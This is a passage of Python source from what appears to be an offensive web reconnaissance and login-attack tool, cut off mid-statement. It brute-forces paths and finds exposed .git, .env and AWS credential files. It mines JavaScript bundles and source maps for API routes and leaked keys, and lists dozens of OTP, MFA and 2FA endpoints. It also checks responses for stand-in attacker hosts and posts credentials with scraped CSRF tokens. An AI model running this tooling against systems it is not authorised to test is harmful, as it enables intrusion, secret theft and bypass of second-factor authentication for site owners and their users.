    r'(_0x[a-f0-9]+)\s*\[\s*(\d+)\s*\]', re.IGNORECASE)


def _resolve_template(tmpl):
    parts = re.split(r'\$\{[^}]+\}', tmpl)
    if len(parts) == 1:
        return [tmpl]
    results = []
    for val in TEMPLATE_VAR_VALUES:
        s = parts[0]
        for p in parts[1:]:
            s += val + p
        results.append(s)
    return results


def _extract_webpack_chunks(text, base_url):
    urls = set()
    for m in WEBPACK_CHUNK_RE.finditer(text or ""):
        prefix, obj_body, suffix = m.groups()
        for kv in re.finditer(r'["\']?(\d+)["\']?\s*:\s*["\']([^"\']+)["\']',
                              obj_body):
            chunk_id, hash_ = kv.groups()
            urls.add(urljoin(base_url, prefix + hash_ + suffix))
    return urls


def _extract_source_map_urls(text, base_url):
    maps = set()
    for m in SOURCE_MAP_EXTERNAL_RE.finditer(text or ""):
        maps.add(urljoin(base_url, m.group(1)))
    for m in SOURCE_MAP_INLINE_RE.finditer(text or ""):
        try:
            decoded = base64.b64decode(m.group(1))
            maps.add(("INLINE", decoded))
        except Exception:
            pass
    return maps


def _parse_source_map(data):
    try:
        if isinstance(data, tuple) and data[0] == "INLINE":
            j = json.loads(data[1])
        else:
            j = json.loads(data)
    except Exception:
        return set()
    found = set()
    for content in (j.get("sourcesContent") or []):
        if content:
            for m in re.finditer(
                    r'["\'`](/[a-zA-Z0-9_/\-\.]{3,120})["\'`]',
                    content):
                p = m.group(1)
                if p.count("/") >= 2 and not p.endswith(
                        (".css", ".png", ".jpg", ".svg", ".map")):
                    found.add(p)
    for src in (j.get("sources") or []):
        if src and isinstance(src, str):
            for m in re.finditer(r'/(api|auth|otp|mfa|2fa)/[^\s"\']+',
                                 src):
                found.add("/" + m.group(0))
    return found


def _deobfuscate_string_table(text):
    tables = {}
    for m in OBFUSCATED_STRING_TABLE_RE.finditer(text or ""):
        var_name, arr_body = m.groups()
        strings = re.findall(r'["\']([^"\']+)["\']', arr_body)
        tables[var_name] = strings
    if not tables:
        return text
    out = text
    for var_name, strings in tables.items():
        pattern = re.compile(
            re.escape(var_name) + r'\s*\[\s*(\d+)\s*\]')
        def repl(m):
            idx = int(m.group(1))
            if 0 <= idx < len(strings):
                return json.dumps(strings[idx])
            return m.group(0)
        out = pattern.sub(repl, out)
    return out


def _ast_extract_constants(text):
    if not _HAVE_ESPRIMA:
        return set()
    if len(text) > 800000:
        return set()
    found = set()
    constants = {}
    try:
        tree = esprima.parseScript(text)
        ast = tree.toDict()
    except Exception:
        return found

    def walk(node):
        if isinstance(node, dict):
            t = node.get("type")
            if t == "VariableDeclarator":
                idn = node.get("id", {})
                init = node.get("init", {})
                if idn.get("type") == "Identifier" and \
                        init.get("type") == "Literal" and \
                        isinstance(init.get("value"), str):
                    constants[idn["name"]] = init["value"]
            if t == "BinaryExpression" and node.get("operator") == "+":
                left = node.get("left", {})
                right = node.get("right", {})
                if left.get("type") == "Literal" and \
                        right.get("type") == "Literal" and \
                        isinstance(left.get("value"), str) and \
                        isinstance(right.get("value"), str):
                    found.add(left["value"] + right["value"])
            if t == "Literal" and isinstance(node.get("value"), str):
                v = node["value"]
                if v.startswith("/") and 3 < len(v) < 200:
                    found.add(v)
            for k, v in node.items():
                walk(v)
        elif isinstance(node, list):
            for v in node:
                walk(v)

    walk(ast)
    for k, v in constants.items():
        if isinstance(v, str) and v.startswith("/") and 3 < len(v) < 200:
            found.add(v)
    return {p for p in found if p.startswith("/")}


def extract_api_urls(text, base_host):
    found = set()
    for pat in API_URL_PATTERNS:
        try:
            for m in re.finditer(pat, text or ""):
                url = m.group(1)
                pu = urlparse(url)
                if pu.hostname and pu.hostname != base_host:
                    continue
                path = pu.path
                if path and path.startswith("/") and 3 < len(path) < 200:
                    found.add(path)
        except re.error:
            continue
    for m in TEMPLATE_LITERAL_RE.finditer(text or ""):
        for resolved in _resolve_template(m.group(1)):
            if resolved.startswith("/") and 3 < len(resolved) < 200:
                found.add(resolved)
    return found


class Recon:
    def __init__(self, sess, base_url, findings, wordlist=None):
        self.sess = sess
        self.base_url = base_url
        self.findings = findings
        self.endpoints = {}
        self.tech = {}
        self.api_endpoints = []
        self.js_urls = set()
        self.discovered_api = set()
        self.sitemap_urls = set()
        self.webpack_chunks = set()
        self.source_maps = []
        self.extracted_from_maps = set()
        self.wordlist = load_wordlist(wordlist)
        self.cache_headers = {}
        self.host_reflections = []

    def _get(self, url, **kw):
        return self.sess.get(url, **kw)

    def run(self):
        PANEL.section("RECON-1  wordlist (paths)")
        self._paths()
        self._filter_noise()
        PANEL.data("paths tested", str(len(self.wordlist)))
        PANEL.data("unique endpoints",
                   str(len([e for e in self.endpoints.values()
                            if not e.noise])))
        PANEL.data("noise filtered",
                   str(len([e for e in self.endpoints.values()
                            if e.noise])))
        PANEL.end_section()

        PANEL.section("RECON-2  auth paths")
        self._auth()
        PANEL.end_section()

        PANEL.section("RECON-3  openapi")
        self._openapi()
        PANEL.end_section()

        PANEL.section("RECON-4  sitemap (incl cross-origin)")
        self._sitemap_crawl()
        PANEL.end_section()

        PANEL.section("RECON-5  js bundles")
        self._js_aggressive()
        PANEL.end_section()

        PANEL.section("RECON-6  webpack chunks")
        self._webpack_chunks()
        PANEL.end_section()

        PANEL.section("RECON-7  source maps")
        self._source_maps()
        PANEL.end_section()

        PANEL.section("RECON-8  js extracted apis")
        self._use_js_apis()
        PANEL.end_section()

        PANEL.section("RECON-9  html")
        self._html()
        PANEL.end_section()

        PANEL.section("RECON-10  robots")
        self._robots()
        PANEL.end_section()

        PANEL.section("RECON-11  TLS SAN")
        self._tls_san()
        PANEL.end_section()

        PANEL.section("RECON-12  security headers + tech")
        self._fingerprint()
        PANEL.end_section()

        PANEL.section("RECON-13  cache detection")
        self._cache_detect()
        PANEL.end_section()

        PANEL.section("RECON-SUMMARY")
        real = [e for e in self.endpoints.values() if not e.noise]
        PANEL.data("endpoints (real)", str(len(real)))
        PANEL.data("js urls", str(len(self.js_urls)))
        PANEL.data("webpack chunks", str(len(self.webpack_chunks)))
        PANEL.data("source maps", str(len(self.source_maps)))
        PANEL.data("map extracted", str(len(self.extracted_from_maps)))
        PANEL.data("js apis", str(len(self.discovered_api)))
        PANEL.data("api endpoints", str(len(self.api_endpoints)))
        PANEL.data("sitemap urls", str(len(self.sitemap_urls)))
        PANEL.data("tech", json.dumps(self.tech))
        PANEL.end_section()
        return {k: v for k, v in self.endpoints.items()
                if not v.noise}

    def _filter_noise(self):
        groups = defaultdict(list)
        for path, ep in self.endpoints.items():
            if ep.size >= 1000 and ep.status in (200, 302, 301):
                groups[(ep.status, ep.size)].append(path)
        for key, paths in groups.items():
            if len(paths) > 20:
                for p in paths:
                    self.endpoints[p].noise = True

    def _paths(self):
        for i, path in enumerate(self.wordlist):
            url = self.base_url + "/" + path
            r = self._get(url, timeout=5)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            content = getattr(r, "content", b"") or b""
            ep = Endpoint(path="/" + path, status=status,
                          size=len(content), source="wordlist")
            self.endpoints["/" + path] = ep
            if i % 50 == 0:
                PANEL.set(status=f"wordlist {i}/{len(self.wordlist)}")
            if status in (200, 201, 204, 400, 401, 403, 405, 500):
                PANEL.data(f"/{path}", f"{status} ({len(content)}b)")
                if status == 200 and len(content) > 20:
                    self._analyze("/" + path, url, r)
                    host_refl = self._host_reflects(r)
                    if host_refl:
                        self.host_reflections.append(
                            ("/" + path, host_refl))
        PANEL.data("tested", str(len(self.wordlist)))

    def _host_reflects(self, r):
        try:
            text = getattr(r, "text", "") or ""
            for marker in ("roselia.example",
                           "evil.example",
                           "attacker.example"):
                if marker in text:
                    return marker
        except Exception:
            pass
        return None

    def _analyze(self, path, url, r):
        body = (getattr(r, "text", "") or "")[:2000]
        low = body.lower()
        if path == "/.git/HEAD" and "ref:" in low:
            self.findings.add(
                title=".git exposed", severity="critical",
                category="disclosure", endpoint=url,
                description="git repo exposed",
                evidence={"body": body[:200]},
                remediation="block .git", cwe="CWE-538")
        elif path == "/.git/config" and "[core]" in low:
            self.findings.add(
                title=".git/config", severity="critical",
                category="disclosure", endpoint=url,
                description="git config leaked",
                evidence={"body": body[:300]},
                remediation="block .git", cwe="CWE-538")
        elif path.startswith("/.env") and "=" in body:
            self.findings.add(
                title=f"{path} exposed", severity="critical",
                category="disclosure", endpoint=url,
                description="env file leaked",
                evidence={"body": body[:500]},
                remediation="block dotfiles", cwe="CWE-538")
        elif path in ("/swagger.json", "/openapi.json", "/api-docs",
                      "/v2/api-docs", "/v3/api-docs") and \
                ('"swagger"' in low or '"openapi"' in low
                 or '"paths"' in low):
            self.findings.add(
                title=f"API spec {path}", severity="high",
                category="disclosure", endpoint=url,
                description="api docs exposed",
                evidence={"size": len(getattr(r, "content", b"")
                                      or b"")},
                remediation="require auth")
        elif path.startswith("/actuator") and \
                len(getattr(r, "content", b"") or b"") > 30:
            self.findings.add(
                title=f"Actuator {path}", severity="high",
                category="disclosure", endpoint=url,
                description="actuator exposed",
                evidence={"body": body[:300]},
                remediation="restrict")
        elif path == "/phpinfo.php" and "php version" in low:
            self.findings.add(
                title="phpinfo", severity="high",
                category="disclosure", endpoint=url,
                description="phpinfo page",
                remediation="remove", cwe="CWE-200")
        elif path == "/server-status" and "apache" in low:
            self.findings.add(
                title="apache status", severity="medium",
                category="disclosure", endpoint=url,
                description="mod_status",
                remediation="acl")
        elif path in ("/backup.zip", "/backup.tar.gz", "/db.sql") \
                and len(getattr(r, "content", b"") or b"") > 100:
            self.findings.add(
                title=f"backup {path}", severity="critical",
                category="disclosure", endpoint=url,
                description="backup exposed",
                evidence={"size": len(getattr(r, "content", b"")
                                      or b"")},
                remediation="remove", cwe="CWE-530")
        elif path == "/.aws/credentials" and "aws_access" in low:
            self.findings.add(
                title="aws creds", severity="critical",
                category="disclosure", endpoint=url,
                description="aws creds leaked",
                evidence={"body": body[:100]},
                remediation="rotate", cwe="CWE-538")
        stack = detect_stacktrace(body)
        if stack:
            self.tech["stacktrace"] = stack

    def _auth(self):
        c = 0
        for path in AUTH_PATHS:
            r = self._get(self.base_url + path, timeout=4)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            if status in (200, 400, 401, 403, 405, 422, 428):
                content = getattr(r, "content", b"") or b""
                existing = self.endpoints.get(path)
                if existing:
                    existing.status = status
                    existing.size = len(content)
                    existing.source = "auth"
                else:
                    self.endpoints[path] = Endpoint(
                        path=path, status=status,
                        size=len(content), source="auth")
                PANEL.data(f"auth {path}",
                           f"{status} ({len(content)}b)")
                c += 1
        self._filter_noise()
        PANEL.data("auth found", str(c))

    def _openapi(self):
        specs = []
        for path in ("/swagger.json", "/openapi.json", "/api-docs",
                     "/v2/api-docs", "/v3/api-docs",
                     "/.well-known/openid-configuration"):
            r = self._get(self.base_url + path, timeout=6)
            if r is None or getattr(r, "status_code", 0) != 200:
                continue
            try:
                j = r.json()
            except Exception:
                continue
            specs.append((path, j))
            paths = j.get("paths", {}) if isinstance(j, dict) else {}
            for p, ops in paths.items():
                low = p.lower()
                if any(k in low for k in
                       ("otp", "mfa", "2fa", "verify", "confirm",
                        "challenge", "token", "login", "auth")):
                    methods = list(ops.keys()) if isinstance(ops, dict) \
                        else []
                    self.api_endpoints.append((p, methods, r.url))
                    if p not in self.endpoints:
                        self.endpoints[p] = Endpoint(
                            path=p, source="openapi",
                            method=methods[0].upper()
                            if methods else "POST")
                    PANEL.data(f"openapi {p}",
                               ",".join(methods) if methods else "?")
        PANEL.data("openapi specs", str(len(specs)))
        PANEL.data("openapi total", str(len(self.api_endpoints)))

    def _sitemap_crawl(self):
        r = self._get(self.base_url + "/sitemap.xml", timeout=6)
        if r is None or getattr(r, "status_code", 0) != 200:
            PANEL.data("sitemap", "not found")
            return
        for m in re.finditer(r"<loc>([^<]+)</loc>",
                             getattr(r, "text", "") or ""):
            u = m.group(1).strip()
            self.sitemap_urls.add(u)
        PANEL.data("sitemap urls", str(len(self.sitemap_urls)))
        cross_origin = set()
        for u in list(self.sitemap_urls):
            pu = urlparse(u)
            if pu.hostname and pu.hostname != \
                    urlparse(self.base_url).hostname:
                cross_origin.add(pu.hostname)
        for h in cross_origin:
            PANEL.data("cross-origin host", h)
        for u in list(self.sitemap_urls)[:30]:
            rr = self._get(u, timeout=6)
            if rr is None or getattr(rr, "status_code", 0) != 200:
                continue
            path = urlparse(u).path
            if path and path not in self.endpoints:
                self.endpoints[path] = Endpoint(
                    path=path,
                    status=getattr(rr, "status_code", 0),
                    size=len(getattr(rr, "content", b"") or b""),
                    source="sitemap-page")
            body = getattr(rr, "text", "") or ""
            for m in re.finditer(
                    r'<script[^>]+src=["\']([^"\']+)["\']', body):
                abs_url = urljoin(u, m.group(1))
                if urlparse(abs_url).hostname == \
                        urlparse(self.base_url).hostname:
                    self.js_urls.add(abs_url)
            for m in re.finditer(
                    r'<link[^>]+href=["\']([^"\']+\.js[^"\']*)["\']',
                    body):
                abs_url = urljoin(u, m.group(1))
                if urlparse(abs_url).hostname == \
                        urlparse(self.base_url).hostname:
                    self.js_urls.add(abs_url)

    def _js_aggressive(self):
        for p in ["/", "/login", "/register", "/signup", "/app",
                  "/account", "/user"]:
            r = self._get(self.base_url + p, timeout=6)
            if r is None or getattr(r, "status_code", 0) != 200:
                continue
            body = getattr(r, "text", "") or ""
            for m in re.finditer(
                    r'<script[^>]+src=["\']([^"\']+)["\']', body):
                u = urljoin(self.base_url, m.group(1))
                if urlparse(u).hostname == \
                        urlparse(self.base_url).hostname:
                    self.js_urls.add(u)
            for m in re.finditer(
                    r'<link[^>]+href=["\']([^"\']+\.js[^"\']*)["\']',
                    body):
                u = urljoin(self.base_url, m.group(1))
                if urlparse(u).hostname == \
                        urlparse(self.base_url).hostname:
                    self.js_urls.add(u)
            for m in VITE_MANIFEST_RE.finditer(body):
                u = urljoin(self.base_url, m.group(1))
                self.js_urls.add(u)
        for path in ("/static/js/main.js",
                     "/static/js/main.chunk.js",
                     "/static/js/bundle.js",
                     "/_next/static/_buildManifest.js",
                     "/main.js", "/app.js", "/bundle.js",
                     "/assets/index.js", "/js/app.js",
                     "/js/main.js"):
            u = self.base_url + path
            r = self._get(u, timeout=6)
            if r is None or getattr(r, "status_code", 0) != 200:
                continue
            if path.endswith(".js"):
                self.js_urls.add(u)
                PANEL.data("probed js", f"{path} 200")
        PANEL.data("js bundles", str(len(self.js_urls)))

    def _webpack_chunks(self):
        for src in sorted(self.js_urls):
            r = self._get(src, timeout=10)
            if r is None or getattr(r, "status_code", 0) != 200:
                continue
            text = getattr(r, "text", "") or ""
            if len(text) < 400000:
                chunks = _extract_webpack_chunks(text, self.base_url)
                for u in chunks:
                    if u not in self.js_urls:
                        self.webpack_chunks.add(u)
                        self.js_urls.add(u)
                        PANEL.data("chunk", u.split("/")[-1][:60])
        PANEL.data("webpack chunks", str(len(self.webpack_chunks)))

    def _source_maps(self):
        for src in sorted(self.js_urls):
            r = self._get(src, timeout=10)
            if r is None or getattr(r, "status_code", 0) != 200:
                continue
            text = getattr(r, "text", "") or ""
            maps = _extract_source_map_urls(text, self.base_url)
            for m in maps:
                if isinstance(m, tuple):
                    self.source_maps.append(m)
                else:
                    rr = self._get(m, timeout=10)
                    if rr is None or \
                            getattr(rr, "status_code", 0) != 200:
                        continue
                    if '"version"' not in (getattr(rr, "text", "")
                                            or ""):
                        continue
                    self.source_maps.append(
                        getattr(rr, "text", "") or "")
                    PANEL.data("source map", m[:70])
        PANEL.data("maps collected", str(len(self.source_maps)))
        for m in self.source_maps:
            self.extracted_from_maps |= _parse_source_map(m)
        for p in self.extracted_from_maps:
            if p not in self.discovered_api:
                self.discovered_api.add(p)
                PANEL.data("map api", p)
        PANEL.data("map extracted", str(len(self.extracted_from_maps)))

    def _use_js_apis(self):
        for src in sorted(self.js_urls):
            r = self._get(src, timeout=10)
            if r is None or getattr(r, "status_code", 0) != 200:
                continue
            text = getattr(r, "text", "") or ""
            deobf = _deobfuscate_string_table(text)
            host = urlparse(self.base_url).hostname
            for p in extract_api_urls(deobf, host):
                if p not in self.discovered_api:
                    self.discovered_api.add(p)
                    PANEL.data("api", p)
            ast_found = _ast_extract_constants(deobf)
            for p in ast_found:
                if p not in self.discovered_api:
                    self.discovered_api.add(p)
                    PANEL.data("api(ast)", p)
            for label, pat in [
                ("AWS Key", r"AKIA[0-9A-Z]{16}"),
                ("Stripe Live", r"sk_live_[0-9a-zA-Z]{24,}"),
                ("GitHub", r"ghp_[0-9A-Za-z]{36}"),
                ("GitLab", r"glpat-[0-9A-Za-z_\-]{20}"),
                ("Slack", r"xox[baprs]-[0-9A-Za-z\-]{10,}"),
                ("Google API", r"AIza[0-9A-Za-z_\-]{35}"),
                ("JWT", r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+"
                        r"\.[A-Za-z0-9_\-]+"),
                ("Private Key",
                 r"-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----"),
            ]:
                for m in re.finditer(pat, text):
                    self.findings.add(
                        title=f"{label} in JS",
                        severity="high", category="disclosure",
                        endpoint=src,
                        description=f"{label} leaked",
                        evidence={"match": m.group(0)[:120]},
                        remediation="rotate", cwe="CWE-798")
        for path in sorted(self.discovered_api):
            url = self.base_url + path
            r = self._get(url, timeout=5)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            content = getattr(r, "content", b"") or b""
            self.endpoints[path] = Endpoint(
                path=path, status=status,
                size=len(content), source="js-api")
            PANEL.data(f"probe {path}", f"{status} ({len(content)}b)")
        self._filter_noise()

    def _html(self):
        r = self._get(self.base_url, timeout=8)
        if r is None:
            return
        body = getattr(r, "text", "") or ""
        if has_captcha(body):
            self.findings.add(
                title="CAPTCHA on landing",
                severity="info", category="captcha",
                endpoint=self.base_url,
                description="captcha detected (informational)",
                evidence={"markers": [m for m in CAPTCHA_MARKERS
                                      if m in body.lower()]},
                remediation="use headless browser",
                cwe="CWE-804")
        for m in re.finditer(r'<meta[^>]+>', body):
            if 'name="generator"' in m.group(0).lower():
                g = re.search(r'content=["\']([^"\']+)["\']',
                              m.group(0))
                if g:
                    self.tech["generator"] = g.group(1)
                    PANEL.data("generator", g.group(1))
        for m in re.finditer(
                r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>', body):
            a = m.group(1)
            if a and not a.startswith("#"):
                p = urlparse(urljoin(self.base_url, a)).path or "/"
                if p not in self.endpoints:
                    self.endpoints[p] = Endpoint(
                        path=p, method="POST", source="form")
                    PANEL.data("form", p)
        for m in re.finditer(
                r'<input[^>]+name=["\']([^"\']+)["\']', body):
            name = m.group(1)
            if name and name not in self.tech.get("inputs", []):
                self.tech.setdefault("inputs", []).append(name)
                PANEL.data("input field", name)
        PANEL.data("html len", str(len(body)))

    def _robots(self):
        r = self._get(self.base_url + "/robots.txt", timeout=5)
        if r and getattr(r, "status_code", 0) == 200:
            text = getattr(r, "text", "") or ""
            for line in text.splitlines():
                stripped = line.strip()
                if stripped.startswith("#"):
                    for m in re.finditer(
                            r'(/[a-zA-Z0-9_/\-\.]{3,80})', stripped):
                        p = m.group(1)
                        if p not in self.endpoints:
                            self.endpoints[p] = Endpoint(
                                path=p, source="robots-comment")
                            PANEL.data("robots(comment)", p)
                    continue
                if stripped.lower().startswith(("disallow:",
                                                "allow:")):
                    p = stripped.split(":", 1)[1].strip()
                    if p and p != "/" and "*" not in p:
                        rr = self._get(self.base_url + p, timeout=4)
                        if rr is not None:
                            self.endpoints[p] = Endpoint(
                                path=p,
                                status=getattr(rr, "status_code", 0),
                                source="robots")
                            PANEL.data(f"robots {p}",
                                       str(getattr(rr,
                                                   "status_code", 0)))

    def _tls_san(self):
        hostname = urlparse(self.base_url).hostname
        if not hostname:
            return
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with ctx.wrap_socket(
                    __import__("socket").socket(),
                    server_hostname=hostname) as s:
                s.settimeout(5)
                s.connect((hostname, 443))
                cert = s.getpeercert(binary_form=False)
            if not cert:
                return
            sans = []
            for typ, val in cert.get("subjectAltName", ()):
                if typ == "DNS":
                    sans.append(val)
            if sans:
                self.tech["tls_sans"] = sans
                for h in sans:
                    if h.startswith("*."):
                        continue
                    if h not in self.endpoints:
                        self.endpoints[
                            f"SAN:{h}"] = Endpoint(
                            path=f"https://{h}", source="tls-san")
                    PANEL.data("SAN", h)
        except Exception:
            pass

    def _fingerprint(self):
        r = self._get(self.base_url, timeout=6)
        if r is None:
            return
        headers = r.headers if hasattr(r, "headers") else {}
        server = headers.get("Server", "")
        xpb = headers.get("X-Powered-By", "")
        body = getattr(r, "text", "") or ""
        self.tech["server"] = server
        self.tech["xpb"] = xpb
        PANEL.data("server", server or "?")
        PANEL.data("x-powered-by", xpb or "?")
        for h, tag in TECH_HEADER_HINTS.items():
            if tag and headers.get(h):
                self.tech[tag] = headers.get(h)
                PANEL.data(f"header {h}", headers.get(h)[:40])
        csp = headers.get("Content-Security-Policy", "")
        if not csp:
            self.findings.add(
                title="missing CSP",
                severity="info", category="headers",
                endpoint=self.base_url,
                description="no Content-Security-Policy header",
                evidence={"headers": dict(headers)},
                remediation="add CSP", cwe="CWE-693")
        for fw, hay, pat in [
            ("nginx", server, r"nginx/(\d+\.\d+\.\d+)"),
            ("apache", server, r"Apache/(\d+\.\d+\.\d+)"),
            ("iis", server, r"IIS/(\d+\.\d+)"),
            ("cloudflare", server, r"cloudflare"),
            ("express", xpb, r"Express"),
            ("php", xpb, r"PHP/(\d+\.\d+\.\d+)"),
            ("aspnet", xpb, r"ASP\.NET"),
            ("jquery", body, r"jquery[.-]?(\d+\.\d+\.\d+)"),
            ("react", body, r"react@?(\d+\.\d+\.\d+)"),
            ("vue", body, r"vue@?(\d+\.\d+\.\d+)"),
            ("angular", body, r"angular@?(\d+\.\d+\.\d+)"),
            ("next", body, r"__NEXT_DATA__"),
            ("nuxt", body, r"__NUXT__"),
            ("django", body, r"csrfmiddlewaretoken"),
            ("rails", body, r"csrf-token"),
            ("laravel", body, r"laravel_session"),
            ("flask", body, r"werkzeug"),
        ]:
            m = re.search(pat, hay, re.IGNORECASE)
            if m:
                ver = m.group(1) if m.groups() else "detected"
                self.tech[fw] = ver
                PANEL.data(f"tech {fw}", str(ver))
        for k, v in self.tech.items():
            if k == "inputs":
                PANEL.data("inputs", ", ".join(v))

    def _cache_detect(self):
        target = self.base_url + "/"
        r1 = self._get(target, timeout=5)
        if r1 is None:
            return
        h = r1.headers if hasattr(r1, "headers") else {}
        h = {k.lower(): v for k, v in h.items()}
        cached = False
        if h.get("age"):
            cached = True
        if "hit" in str(h.get("x-cache", "")).lower():
            cached = True
        if "cf-cache-status" in h:
            cached = True
        self.tech["cached"] = cached
        PANEL.data("cache detected", str(cached))
        if cached:
            self.findings.add(
                title="CDN cache detected",
                severity="info", category="cache",
                endpoint=target,
                description="responses served from CDN cache",
                evidence={k: v for k, v in h.items()
                          if k.startswith(("x-cache", "age",
                                           "cf-cache",
                                           "x-served-by"))},
                remediation="cache key must include auth state",
                cwe="CWE-525")


AUTH_PATHS = [
    "/otp/request", "/otp/verify", "/otp/send", "/otp/check",
    "/otp/validate", "/otp/submit", "/otp/confirm",
    "/mfa/request", "/mfa/verify", "/mfa/send", "/mfa/check",
    "/mfa/validate", "/mfa/submit", "/mfa/confirm", "/mfa/challenge",
    "/2fa/request", "/2fa/verify", "/2fa/send", "/2fa/check",
    "/2fa/validate", "/2fa/submit", "/2fa/confirm",
    "/auth/otp/request", "/auth/otp/verify", "/auth/otp",
    "/auth/mfa/request", "/auth/mfa/verify", "/auth/mfa",
    "/auth/2fa/request", "/auth/2fa/verify", "/auth/2fa",
    "/api/otp/request", "/api/otp/verify", "/api/otp/send",
    "/api/otp/check", "/api/mfa/request", "/api/mfa/verify",
    "/api/mfa/send", "/api/mfa/check", "/api/mfa/challenge",
    "/api/2fa/request", "/api/2fa/verify",
    "/api/auth/otp/request", "/api/auth/otp/verify",
    "/api/auth/mfa/request", "/api/auth/mfa/verify",
    "/api/auth/2fa/request", "/api/auth/2fa/verify",
    "/api/auth/challenge", "/api/auth/verify",
    "/api/v1/otp/request", "/api/v1/otp/verify",
    "/api/v1/auth/otp/request", "/api/v1/auth/otp/verify",
    "/api/v1/auth/mfa/request", "/api/v1/auth/mfa/verify",
    "/api/v2/otp/request", "/api/v2/otp/verify",
    "/api/v2/auth/otp/request", "/api/v2/auth/otp/verify",
    "/v1/otp/request", "/v1/otp/verify", "/v2/otp/request",
    "/v2/otp/verify", "/login/otp", "/login/verify",
    "/login/mfa", "/login/2fa", "/login/challenge",
    "/verify-otp", "/verify-mfa", "/verify-2fa", "/verify-code",
    "/confirm-otp", "/confirm-mfa", "/confirm-code",
    "/check-otp", "/check-code", "/validate-otp",
    "/validate-code", "/submit-otp", "/submit-code",
    "/send-otp", "/send-code", "/request-code", "/request-otp",
    "/issue-otp", "/generate-otp", "/resend-otp", "/resend-code",
]

REGISTER_PATHS = [
    "/register", "/signup", "/sign-up", "/api/register",
    "/api/signup", "/api/sign-up", "/api/v1/register",
    "/api/v1/signup", "/api/v2/register", "/api/auth/register",
    "/auth/register", "/auth/signup", "/user/register",
    "/users/register", "/account/create", "/api/account/create",
    "/api/users", "/users",
]

LOGIN_PATHS = [
    "/login", "/signin", "/sign-in", "/api/login", "/api/signin",
    "/api/auth/login", "/api/v1/login", "/api/v1/auth/login",
    "/auth/login", "/auth/signin", "/user/login", "/session",
    "/api/session", "/oauth/token", "/token", "/api/token",
]



@dataclass
class Flow:
    verify_url: str = ""
    request_url: str = ""
    register_url: str = ""
    login_url: str = ""
    reset_url: str = ""
    account: str = ""
    password: str = ""
    account_2: str = ""
    payload_verify: dict = field(default_factory=dict)
    payload_request: dict = field(default_factory=dict)
    verify_style: str = "json"
    baseline_hash: str = ""
    baseline_len: int = 0
    baseline_status: int = 0
    baseline_body: str = ""
    baselines: dict = field(default_factory=dict)
    sessions: list = field(default_factory=list)
    session_cookies: dict = field(default_factory=dict)
    csrf_token: str = ""
    csrf_field: str = ""
    reason: str = ""
    login_state: list = field(default_factory=list)
    discovered_fields: list = field(default_factory=list)


class LoginFlow:
    def __init__(self, sess, base_url, findings, flow):
        self.sess = sess
        self.base_url = base_url
        self.findings = findings
        self.flow = flow

    def _get(self, url, **kw):
        return self.sess.get(url, **kw)

    def _post(self, url, **kw):
        return self.sess.post(url, **kw)

    def run(self):
        if not self.flow.login_url:
            PANEL.emit(C.YELLOW, "LOGIN",
                       "no login url — skipping state machine")
            return
        PANEL.section("LOGIN-SM")
        self._step1_get()
        self._step2_extract()
        self._step3_post()
        PANEL.end_section()

    def _step1_get(self):
        r = self._get(self.flow.login_url, timeout=8)
        if r is None:
            return
        self.flow.login_state.append({
            "step": "get_login",
            "url": self.flow.login_url,
            "status": getattr(r, "status_code", 0),
            "len": len(getattr(r, "content", b"") or b""),
        })
        PANEL.data("login GET",
                   f"{getattr(r, 'status_code', 0)} "
                   f"{len(getattr(r, 'content', b'') or b'')}b")
        cookies = {}
        if hasattr(r, "cookies"):
            try:
                for c in r.cookies:
                    cookies[c.name] = c.value
            except Exception:
                pass
        self.flow.session_cookies.update(cookies)
        text = getattr(r, "text", "") or ""
        self._extract_csrf(text)

    def _extract_csrf(self, text):
        if not text:
            return
        patterns = [
            (r'name=["\']_csrf["\'][^>]*value=["\']([^"\']+)["\']',
             "_csrf"),
            (r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
             "csrf_token"),
            (r'name=["\']csrfmiddlewaretoken["\'][^>]*'
             r'value=["\']([^"\']+)["\']', "csrfmiddlewaretoken"),
            (r'name=["\']authenticity_token["\'][^>]*'
             r'value=["\']([^"\']+)["\']', "authenticity_token"),
            (r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
             "_token"),
            (r'<meta[^>]+name=["\']csrf-token["\'][^>]+'
             r'content=["\']([^"\']+)["\']', "csrf-token-meta"),
        ]
        for pat, name in patterns:
            m = re.search(pat, text)
            if m:
                self.flow.csrf_token = m.group(1)
                self.flow.csrf_field = name
                PANEL.data("csrf token", f"{name} ({len(m.group(1))}b)")
                return
        m = re.search(r'<input[^>]+name=["\'](\w+)["\'][^>]+'
                      r'value=["\']([^"\']{16,})["\']', text)
        if m:
            self.flow.csrf_field = m.group(1)
            self.flow.csrf_token = m.group(2)
            PANEL.data("csrf token",
                       f"{self.flow.csrf_field} (guessed)")

    def _step2_extract(self):
        if not self.flow.csrf_token:
            PANEL.data("csrf", "none (may be cookie-based)")

    def _step3_post(self):
        if not self.flow.account or not self.flow.password:
            return
        payload = {
            "username": self.flow.account,
            "email": self.flow.account,
            "password": self.flow.password,
        }
        if self.flow.csrf_token and self.flow.csrf_field:
            payload[self.flow.csrf_field] = self.flow.csrf_token
        for style in ("json", "form"):
            if style == "json":
                r = self._post(self.flow.login_url, json=payload,
                               timeout=8)
            else:
                r = self._post(self.flow.login_url, data=payload,
                               timeout=8)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            loc = ""
            if hasattr(r, "headers"):
                loc = r.headers.get("Location", "")
            self.flow.login_state.append({
                "step": f"post_login_{style}",
                "url": self.flow.login_url,
                "status": status,
                "len": len(getattr(r, "content", b"") or b""),
                "location": loc[:200],
            })
            PANEL.data(f"login POST ({style})",
                       f"{status} len={len(text)} "
                       f"loc={loc[:50]}")
            if status in (301, 302, 303):
                PANEL.data("login redirect", loc[:80])
                cookies = {}
                if hasattr(r, "cookies"):
                    try:
                        for c in r.cookies:
                            cookies[c.name] = c.value
                    except Exception:
                        pass
                self.flow.session_cookies.update(cookies)
                if loc and "otp" in loc.lower() or \
                        "verify" in loc.lower() or \
                        "mfa" in loc.lower():
                    PANEL.emit(C.NEON, "LOGIN",
